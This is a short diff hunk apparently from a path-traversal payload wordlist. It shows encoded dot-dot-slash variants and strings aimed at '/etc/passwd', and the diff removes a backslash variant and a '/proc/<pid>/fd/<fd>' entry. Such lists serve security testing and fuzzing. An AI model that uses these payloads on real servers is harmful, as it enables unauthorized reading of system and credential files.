@@ -8,10 +8,6 @@
 %uff0e%uff0e%u2215
 %uff0e%uff0e%u2216
 ..././
-...\.\
-/proc/<int>/fd/<int>
-e.g.
-/proc/2116/fd/11
 ..//etc/passwd
 ../..//etc/passwd
 ../../..//etc/passwd
